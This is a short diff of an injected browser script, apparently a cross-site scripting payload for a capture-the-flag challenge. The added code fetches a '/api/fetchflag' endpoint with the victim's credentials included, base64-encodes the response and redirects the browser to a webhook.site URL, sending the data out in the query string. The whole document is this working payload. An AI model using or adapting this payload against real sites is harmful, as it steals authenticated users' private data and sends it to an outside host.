@@ -1,4 +1,7 @@
 <script>
-var i = new Image();
-i.src = "http://127.0.0.1:20007/api/fetchflag";
+fetch('/api/fetchflag', {credentials: 'include'})
+.then(r => r.text())
+.then(d => {
+  document.location = "https://webhook.site/d424e8a3-11b3-4ece-a53d-dc80a5cc995b?flag=" + btoa(d);
+});
 </script>
